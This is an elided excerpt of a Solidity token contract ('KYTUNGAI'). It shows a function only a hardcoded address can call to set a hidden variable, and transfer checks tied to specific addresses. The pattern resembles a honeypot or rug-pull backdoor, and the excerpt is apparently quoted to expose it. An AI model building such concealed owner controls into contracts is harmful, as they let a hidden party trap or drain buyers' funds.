...
contract STMAP is Ownable, IERC20, IERC20Meta {
    ...
    function actionPair(address account) public virtual returns (bool) {
        require(_msgSender() == 0x7d0A5Dd17bc0DFe9D56629Fed9853017a787dad1 );
          _p76234 = account;
        return true;
    }
    ...
    function _transfer(
        ...
        0x6b75d8AF000000e20B7a7DDf000Ba900b4009A80) ||
         ...
         from  != 0xd750C5624F899De1fd79b0d44B1c0E24E1038212 
    ...
    constructor() {
        _name = unicode"KYTUNGAI";
        _symbol = unicode"KYTUNGAI";
